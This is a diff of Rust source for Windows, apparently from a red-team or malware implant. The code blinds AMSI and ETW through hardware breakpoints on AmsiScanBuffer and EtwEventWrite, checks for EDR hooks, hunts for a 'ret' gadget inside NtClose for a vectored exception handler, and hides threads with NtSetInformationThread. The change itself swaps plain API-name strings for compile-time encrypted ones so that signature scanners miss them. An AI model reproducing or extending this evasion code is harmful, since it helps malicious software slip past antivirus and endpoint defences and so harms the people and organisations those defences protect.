@@ -36,9 +36,9 @@ unsafe extern "system" fn veh_handler(exception_info: *mut winapi::um::winnt::EX
             // Use NtClose as a known, small syscall stub to safely find a 'ret' (0xC3) 
             // gadget without hitting false positives in complex instructions.
             let mut ptr = rip as *const u8; // Fallback to current rip if resolving fails
-            let ntdll = winapi::um::libloaderapi::GetModuleHandleA(b"ntdll.dll\0".as_ptr() as _);
+            let ntdll = winapi::um::libloaderapi::GetModuleHandleA(string_crypt::enc_str!("ntdll.dll").as_ptr() as _);
             if !ntdll.is_null() {
-                let nt_close = winapi::um::libloaderapi::GetProcAddress(ntdll, b"NtClose\0".as_ptr() as _);
+                let nt_close = winapi::um::libloaderapi::GetProcAddress(ntdll, string_crypt::enc_str!("NtClose").as_ptr() as _);
                 if !nt_close.is_null() {
                     let p = nt_close as *const u8;
                     // Check if NtClose starts with E9 (jmp), which typically indicates an EDR hook
@@ -73,18 +73,18 @@ pub unsafe fn setup_hardware_breakpoints() {
 
     let mut configured = false;
 
-    let amsi = LoadLibraryA(b"amsi.dll\0".as_ptr() as _);
+    let amsi = LoadLibraryA(string_crypt::enc_str!("amsi.dll").as_ptr() as _);
     if !amsi.is_null() {
-        let addr = GetProcAddress(amsi, b"AmsiScanBuffer\0".as_ptr() as _);
+        let addr = GetProcAddress(amsi, string_crypt::enc_str!("AmsiScanBuffer").as_ptr() as _);
         if !addr.is_null() {
             AMSI_ADDR.store(addr as usize, Ordering::Relaxed);
             configured = true;
         }
     }
 
-    let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr() as _);
+    let ntdll = GetModuleHandleA(string_crypt::enc_str!("ntdll.dll").as_ptr() as _);
     if !ntdll.is_null() {
-        let addr = GetProcAddress(ntdll, b"EtwEventWrite\0".as_ptr() as _);
+        let addr = GetProcAddress(ntdll, string_crypt::enc_str!("EtwEventWrite").as_ptr() as _);
         if !addr.is_null() {
             ETW_ADDR.store(addr as usize, Ordering::Relaxed);
             configured = true;
@@ -147,9 +147,9 @@ pub unsafe fn patch_amsi() {}
 #[cfg(windows)]
 pub fn hide_current_thread() {
     unsafe {
-        let ntdll = winapi::um::libloaderapi::GetModuleHandleA(b"ntdll.dll\0".as_ptr() as _);
+        let ntdll = winapi::um::libloaderapi::GetModuleHandleA(string_crypt::enc_str!("ntdll.dll").as_ptr() as _);
         if !ntdll.is_null() {
-            let func = winapi::um::libloaderapi::GetProcAddress(ntdll, b"NtSetInformationThread\0".as_ptr() as _);
+            let func = winapi::um::libloaderapi::GetProcAddress(ntdll, string_crypt::enc_str!("NtSetInformationThread").as_ptr() as _);
             if !func.is_null() {
                 let nt_set_info_thread: extern "system" fn(winapi::um::winnt::HANDLE, u32, *mut winapi::ctypes::c_void, u32) -> i32 = std::mem::transmute(func);
                 nt_set_info_thread(
